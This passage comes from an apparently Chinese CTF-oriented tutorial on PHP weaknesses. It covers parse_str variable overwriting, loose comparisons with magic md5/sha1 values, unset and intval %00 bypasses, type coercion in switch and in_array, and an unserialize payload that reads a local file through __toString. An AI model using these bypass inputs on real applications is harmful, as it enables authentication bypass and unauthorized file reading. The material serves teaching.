    <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">if</span>(!preg_match(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">"/(\d+)\.(\d+)\.(\d+)\.(\d+)/"</span>,<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$ip</span>)) {
      <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">die</span>(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'error'</span>);
    } <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">else</span> {
       <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">echo</span>(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'key...'</span>);
    }
    <span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">?&gt;</span>`</pre>

*   1
*   2
*   3
*   4
*   5
*   6
*   7
*   8

    ### <a style="box-sizing: border-box; outline: 0px; color: #4ea1db; cursor: pointer; word-break: break-all;" name="t8"></a><span style="box-sizing: border-box; outline: 0px; word-break: break-all;">9.parse_str</span>

    与 parse_str() 类似的函数还有 mb_parse_str()，parse_str 将字符串解析成多个变量，如果参数str是URL传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。&nbsp;
    时变量覆盖的一种

    <pre name="code" class="prettyprint">`<span class="xml" style="box-sizing: border-box; outline: 0px; word-break: break-all;"><span class="php" style="box-sizing: border-box; outline: 0px; word-break: break-all;"><span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">&lt;?php</span>
        <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$var</span>=<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'init'</span>;  
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">print</span> <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$var</span>.<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">"&lt;/br&gt;"</span>;
        parse_str(<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$_SERVER</span>[<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'QUERY_STRING'</span>]);  
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">echo</span> <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$_SERVER</span>[<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'QUERY_STRING'</span>].<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">"&lt;/br&gt;"</span>;
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">print</span> <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$var</span>;
    <span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">?&gt;</span></span></span>`</pre>

*   1
*   2
*   3
*   4
*   5
*   6
*   7

    ### <a style="box-sizing: border-box; outline: 0px; color: #4ea1db; cursor: pointer; word-break: break-all;" name="t9"></a><span style="box-sizing: border-box; outline: 0px; word-break: break-all;">10.字符串比较</span>

    <pre name="code" class="prettyprint">`<span class="php" style="box-sizing: border-box; outline: 0px; word-break: break-all;"><span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">&lt;?php</span>  
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">echo</span> <span class="hljs-number" style="box-sizing: border-box; outline: 0px; color: #006666; word-break: break-all;">0</span> == <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'a'</span> ;<span class="hljs-comment" style="box-sizing: border-box; outline: 0px; color: #880000; word-break: break-all;">// a 转换为数字为 0    重点注意</span>
        <span class="hljs-comment" style="box-sizing: border-box; outline: 0px; color: #880000; word-break: break-all;">// 0x 开头会被当成16进制54975581388的16进制为 0xccccccccc</span>
        <span class="hljs-comment" style="box-sizing: border-box; outline: 0px; color: #880000; word-break: break-all;">// 十六进制与整数，被转换为同一进制比较</span>
        <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'0xccccccccc'</span> == <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'54975581388'</span> ;

        <span class="hljs-comment" style="box-sizing: border-box; outline: 0px; color: #880000; word-break: break-all;">// 字符串在与数字比较前会自动转换为数字，如果不能转换为数字会变成0</span>
        <span class="hljs-number" style="box-sizing: border-box; outline: 0px; color: #006666; word-break: break-all;">1</span> == <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'1'</span>;
        <span class="hljs-number" style="box-sizing: border-box; outline: 0px; color: #006666; word-break: break-all;">1</span> == <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'01'</span>;
        <span class="hljs-number" style="box-sizing: border-box; outline: 0px; color: #006666; word-break: break-all;">10</span> == <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'1e1'</span>;
        <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'100'</span> == <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'1e2'</span> ;    

        <span class="hljs-comment" style="box-sizing: border-box; outline: 0px; color: #880000; word-break: break-all;">// 十六进制数与带空格十六进制数，被转换为十六进制整数</span>
        <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'0xABCdef'</span>  == <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'     0xABCdef'</span>;
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">echo</span> <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'0010e2'</span> == <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'1e3'</span>;
        <span class="hljs-comment" style="box-sizing: border-box; outline: 0px; color: #880000; word-break: break-all;">// 0e 开头会被当成数字，又是等于 0*10^xxx=0</span>
        <span class="hljs-comment" style="box-sizing: border-box; outline: 0px; color: #880000; word-break: break-all;">// 如果 md5 是以 0e 开头，在做比较的时候，可以用这种方法绕过</span>
        <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'0e509367213418206700842008763514'</span> == <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'0e481036490867661113260034900752'</span>;
        <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'0e481036490867661113260034900752'</span> == <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'0'</span> ;

        var_dump(md5(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'240610708'</span>) == md5(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'QNKCDZO'</span>));
        var_dump(md5(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'aabg7XSs'</span>) == md5(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'aabC9RqS'</span>));
        var_dump(sha1(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'aaroZmOk'</span>) == sha1(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'aaK1STfY'</span>));
        var_dump(sha1(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'aaO8zKZF'</span>) == sha1(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'aa3OFF9m'</span>));
    <span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">?&gt;</span></span>`</pre>

*   1
*   2
*   3
*   4
*   5
*   6
*   7
*   8
*   9
*   10
*   11
*   12
*   13
*   14
*   15
*   16
*   17
*   18
*   19
*   20
*   21
*   22
*   23
*   24
*   25

    ### <a style="box-sizing: border-box; outline: 0px; color: #4ea1db; cursor: pointer; word-break: break-all;" name="t10"></a><span style="box-sizing: border-box; outline: 0px; word-break: break-all;">11.unset</span>

    unset(bar);用来销毁指定的变量，如果变量bar 包含在请求参数中，可能出现销毁一些变量而实现程序逻辑绕过。

    <pre name="code" class="prettyprint">`<span class="php" style="box-sizing: border-box; outline: 0px; word-break: break-all;"><span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">&lt;?php</span>  
    <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$_CONFIG</span>[<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'extraSecure'</span>] = <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">true</span>;

    <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">foreach</span>(<span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">array</span>(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'_GET'</span>,<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'_POST'</span>) <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">as</span> <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$method</span>) {
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">foreach</span>(<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$$method</span> <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">as</span> <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$key</span>=&gt;<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$value</span>) {
          <span class="hljs-comment" style="box-sizing: border-box; outline: 0px; color: #880000; word-break: break-all;">// $key == _CONFIG</span>
          <span class="hljs-comment" style="box-sizing: border-box; outline: 0px; color: #880000; word-break: break-all;">// $$key == $_CONFIG</span>
          <span class="hljs-comment" style="box-sizing: border-box; outline: 0px; color: #880000; word-break: break-all;">// 这个函数会把 $_CONFIG 变量销毁</span>
          <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">unset</span>(<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$$key</span>);
        }
    }

    <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">if</span> (<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$_CONFIG</span>[<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'extraSecure'</span>] == <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">false</span>) {
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">echo</span> <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'flag {****}'</span>;
    }
    <span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">?&gt;</span></span>`</pre>

*   1
*   2
*   3
*   4
*   5
*   6
*   7
*   8
*   9
*   10
*   11
*   12
*   13
*   14
*   15
*   16

    ### <a style="box-sizing: border-box; outline: 0px; color: #4ea1db; cursor: pointer; word-break: break-all;" name="t11"></a><span style="box-sizing: border-box; outline: 0px; word-break: break-all;">12.intval()</span>

    int转string：

    <pre name="code" class="prettyprint">`<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$var</span> = <span class="hljs-number" style="box-sizing: border-box; outline: 0px; color: #006666; word-break: break-all;">5</span>;  
    方式<span class="hljs-number" style="box-sizing: border-box; outline: 0px; color: #006666; word-break: break-all;">1</span>：<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$item</span> = (<span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">string</span>)<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$var</span>;  
    方式<span class="hljs-number" style="box-sizing: border-box; outline: 0px; color: #006666; word-break: break-all;">2</span>：<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$item</span> = strval(<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$var</span>); `</pre>

*   1
*   2
*   3

    string转int：intval()函数。

    <pre name="code" class="prettyprint">`<span class="hljs-function" style="box-sizing: border-box; outline: 0px; word-break: break-all;">var_dump(<span class="hljs-function" style="box-sizing: border-box; outline: 0px; word-break: break-all;">intval(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'2'</span>)</span>)</span> <span class="hljs-comment" style="box-sizing: border-box; outline: 0px; color: #880000; word-break: break-all;">//2  </span>
    <span class="hljs-function" style="box-sizing: border-box; outline: 0px; word-break: break-all;">var_dump(<span class="hljs-function" style="box-sizing: border-box; outline: 0px; word-break: break-all;">intval(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'3abcd'</span>)</span>)</span> <span class="hljs-comment" style="box-sizing: border-box; outline: 0px; color: #880000; word-break: break-all;">//3  </span>
    <span class="hljs-function" style="box-sizing: border-box; outline: 0px; word-break: break-all;">var_dump(<span class="hljs-function" style="box-sizing: border-box; outline: 0px; word-break: break-all;">intval(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'abcd'</span>)</span>)</span> <span class="hljs-comment" style="box-sizing: border-box; outline: 0px; color: #880000; word-break: break-all;">//0 </span>
    可以使用字符串-0转换，来自于wechall的方法`</pre>

*   1
*   2
*   3
*   4

    说明intval()转换的时候，会将从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串，intval()不会报错而是返回0&nbsp;
    顺便说一下，intval可以被%00截断

    <pre name="code" class="prettyprint">`<span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">if</span>(<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">$req</span>[<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'number'</span>]!=strval(intval(<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">$req</span>[<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'number'</span>]))){
         <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">$info</span> = <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">"number must be equal to it's integer!! "</span>;  
    }`</pre>

*   1
*   2
*   3

    如果当$req[&lsquo;number&rsquo;]=0%00即可绕过

    ### <a style="box-sizing: border-box; outline: 0px; color: #4ea1db; cursor: pointer; word-break: break-all;" name="t12"></a><span style="box-sizing: border-box; outline: 0px; word-break: break-all;">13.switch()</span>

    如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型，效果相当于intval函数。如下：

    <pre name="code" class="prettyprint">`<span class="php" style="box-sizing: border-box; outline: 0px; word-break: break-all;"><span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">&lt;?php</span>
        <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$i</span> =<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">"abc"</span>;  
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">switch</span> (<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$i</span>) {  
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">case</span> <span class="hljs-number" style="box-sizing: border-box; outline: 0px; color: #006666; word-break: break-all;">0</span>:  
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">case</span> <span class="hljs-number" style="box-sizing: border-box; outline: 0px; color: #006666; word-break: break-all;">1</span>:  
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">case</span> <span class="hljs-number" style="box-sizing: border-box; outline: 0px; color: #006666; word-break: break-all;">2</span>:  
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">echo</span> <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">"i is less than 3 but not negative"</span>;  
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">break</span>;  
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">case</span> <span class="hljs-number" style="box-sizing: border-box; outline: 0px; color: #006666; word-break: break-all;">3</span>:  
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">echo</span> <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">"i is 3"</span>;  
        } 
    <span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">?&gt;</span></span>`</pre>

*   1
*   2
*   3
*   4
*   5
*   6
*   7
*   8
*   9
*   10
*   11
*   12

    ### <a style="box-sizing: border-box; outline: 0px; color: #4ea1db; cursor: pointer; word-break: break-all;" name="t13"></a><span style="box-sizing: border-box; outline: 0px; word-break: break-all;">14.in_array()</span>

    <pre name="code" class="prettyprint">`<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">$array</span>=[<span class="hljs-number" style="box-sizing: border-box; outline: 0px; color: #006666; word-break: break-all;">0</span>,<span class="hljs-number" style="box-sizing: border-box; outline: 0px; color: #006666; word-break: break-all;">1</span>,<span class="hljs-number" style="box-sizing: border-box; outline: 0px; color: #006666; word-break: break-all;">2</span>,<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'3'</span>];  
    var_dump(<span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">in</span>_array(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'abc'</span>, <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">$array</span>)); //<span class="hljs-literal" style="box-sizing: border-box; outline: 0px; color: #006666; word-break: break-all;">true</span>  
    var_dump(<span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">in</span>_array(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'1bc'</span>, <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">$array</span>)); //<span class="hljs-literal" style="box-sizing: border-box; outline: 0px; color: #006666; word-break: break-all;">true</span> `</pre>

*   1
*   2
*   3

    在所有php认为是int的地方输入string，都会被强制转换

    ### <a style="box-sizing: border-box; outline: 0px; color: #4ea1db; cursor: pointer; word-break: break-all;" name="t14"></a><span style="box-sizing: border-box; outline: 0px; word-break: break-all;">15.serialize 和 unserialize漏洞</span>

    <pre class="prettyprint">`这里我们先简单介绍一下php中的魔术方法（这里如果对于类、对象、方法不熟的先去学学吧），即Magic方法，php类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号__开头的，比如 __construct， __destruct，__toString，__sleep，__wakeup等等。这些函数都会在某些特殊时候被自动调用。 
    例如__construct()方法会在一个对象被创建时自动调用，对应的__destruct则会在一个对象被销毁时调用等等。 
    这里有两个比较特别的Magic方法，__sleep 方法会在一个对象被序列化的时候调用。 __wakeup方法会在一个对象被反序列化的时候调用。
    `</pre>

*   1
*   2
*   3
*   4
    <pre name="code" class="prettyprint">`<span class="php" style="box-sizing: border-box; outline: 0px; word-break: break-all;"><span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">&lt;?php</span>
    <span class="hljs-class" style="box-sizing: border-box; outline: 0px; word-break: break-all;"><span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">class</span> <span class="hljs-title" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">test</span>
    {</span>
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">public</span> <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$username</span> = <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">''</span>;
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">public</span> <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$password</span> = <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">''</span>;
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">public</span> <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$file</span> = <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">''</span>;
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">public</span> <span class="hljs-function" style="box-sizing: border-box; outline: 0px; word-break: break-all;"><span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">function</span> <span class="hljs-title" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">out</span><span class="hljs-params" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">()</span>{</span>
            <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">echo</span> <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">"username: "</span>.<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$this</span>-&gt;username.<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">"&lt;br&gt;"</span>.<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">"password: "</span>.<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$this</span>-&gt;password ;
        }
         <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">public</span> <span class="hljs-function" style="box-sizing: border-box; outline: 0px; word-break: break-all;"><span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">function</span> <span class="hljs-title" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">__toString</span><span class="hljs-params" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">()</span> {</span>
            <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">return</span> file_get_contents(<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$this</span>-&gt;file);
        }
    }
    <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$a</span> = <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">new</span> test();
    <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$a</span>-&gt;file = <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'C:\Users\YZ\Desktop\plan.txt'</span>;
    <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">echo</span> serialize(<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$a</span>);
    <span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">?&gt;</span></span>
    //tostring方法会在输出实例的时候执行，如果实例路径是隐秘文件就可以读取了`</pre>

*   1
*   2
*   3
*   4
*   5
*   6
*   7
*   8
*   9
*   10
*   11
*   12
*   13
*   14
*   15
*   16
*   17
*   18

    echo unserialize触发了__tostring函数，下面就可以读取了C:\Users\YZ\Desktop\plan.txt文件了

    <pre name="code" class="prettyprint">`<span class="php" style="box-sizing: border-box; outline: 0px; word-break: break-all;"><span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">&lt;?php</span>
    <span class="hljs-class" style="box-sizing: border-box; outline: 0px; word-break: break-all;"><span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">class</span> <span class="hljs-title" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">test</span>
    {</span>
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">public</span> <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$username</span> = <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">''</span>;
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">public</span> <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$password</span> = <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">''</span>;
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">public</span> <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$file</span> = <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">''</span>;
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">public</span> <span class="hljs-function" style="box-sizing: border-box; outline: 0px; word-break: break-all;"><span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">function</span> <span class="hljs-title" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">out</span><span class="hljs-params" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">()</span>{</span>
            <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">echo</span> <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">"username: "</span>.<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$this</span>-&gt;username.<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">"&lt;br&gt;"</span>.<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">"password: "</span>.<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$this</span>-&gt;password ;
        }
         <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">public</span> <span class="hljs-function" style="box-sizing: border-box; outline: 0px; word-break: break-all;"><span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">function</span> <span class="hljs-title" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">__toString</span><span class="hljs-params" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">()</span> {</span>
            <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">return</span> file_get_contents(<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$this</span>-&gt;file);
        }
    }
    <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$a</span> = <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'O:4:"test":3:{s:8:"username";s:0:"";s:8:"password";s:0:"";s:4:"file";s:28:"C:\Users\YZ\Desktop\plan.txt";}'</span>;
    <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">echo</span> unserialize(<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$a</span>);
    <span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">?&gt;</span></span>

*   1
*   2
*   3
*   4
*   5
*   6
*   7
*   8
*   9
*   10
*   11
*   12
*   13
*   14
*   15
*   16

### <a style="box-sizing: border-box; outline: 0px; color: #4ea1db; cursor: pointer; word-break: break-all;" name="t15"></a><span style="box-sizing: border-box; outline: 0px; word-break: break-all;">16.session 反序列化漏洞</span>

主要原因是&nbsp;
